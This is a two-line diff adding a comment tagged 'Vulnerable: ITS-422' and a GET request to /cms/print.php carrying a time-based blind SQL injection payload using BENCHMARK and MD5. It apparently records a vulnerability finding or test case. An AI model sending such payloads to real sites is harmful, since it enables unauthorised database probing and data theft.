@@ -1,0 +1,2 @@
+# Vulnerable: ITS-422
+GET /cms/print.php?id=1%20AND%207334=BENCHMARK(8000000,MD5(0x73636a72))
